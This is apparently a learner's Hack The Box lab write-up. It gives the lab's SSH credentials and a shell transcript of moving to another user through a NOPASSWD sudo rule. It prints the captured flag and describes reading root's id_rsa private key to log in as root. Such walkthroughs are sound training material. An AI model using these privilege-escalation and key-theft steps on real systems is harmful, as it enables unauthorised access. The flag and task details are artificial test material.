## SSH to 83.136.249.33 with user "user1" and password "password1"

1. SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
2. Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'. 

## Notes

```
User user1 may run the following commands on ng-1423594-gettingstartedprivesc-g7cea-5bb59f9ff7-drh8x:
    (user2 : user2) NOPASSWD: /bin/bash

```
This may be useful later for priv exec
```
User user1 may run the following commands on ng-1423594-gettingstartedprivesc-g7cea-5bb59f9ff7-drh8x:
    (user2 : user2) NOPASSWD: /bin/bash
user1@ng-1423594-gettingstartedprivesc-g7cea-5bb59f9ff7-drh8x:/$ sudo -u user2 /bin/bash
user2@ng-1423594-gettingstartedprivesc-g7cea-5bb59f9ff7-drh8x:/$ dir
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
user2@ng-1423594-gettingstartedprivesc-g7cea-5bb59f9ff7-drh8x:/$ dir home
user1  user2
user2@ng-1423594-gettingstartedprivesc-g7cea-5bb59f9ff7-drh8x:/$ cd /home/user2
user2@ng-1423594-gettingstartedprivesc-g7cea-5bb59f9ff7-drh8x:~$ dir
flag.txt
user2@ng-1423594-gettingstartedprivesc-g7cea-5bb59f9ff7-drh8x:~$ cat flag.txt
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}

```
Was able to `sudo -u user2 /bin/bash` which weirdly moved me over to user2, I then navigated to their home directory and read the first flag.
[Exploit for NOPASSWD /bin/bash ](https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d) 

This is interesting
![image](https://github.com/user-attachments/assets/7994d2ee-9c99-46e1-b5e1-cc0bd8b90ce8)

Doesn't appear the cron jobs are useful to me
Nothing in command history

![image](https://github.com/user-attachments/assets/3ab80913-5de4-461a-a700-342c2589d7b4)

I was able to use `find / -name authorized_keys`

We can read the id_rsa so we can copy the key and login as root from our machine

![image](https://github.com/user-attachments/assets/610ac717-e356-40c2-bd03-4ba8c0af15dc)

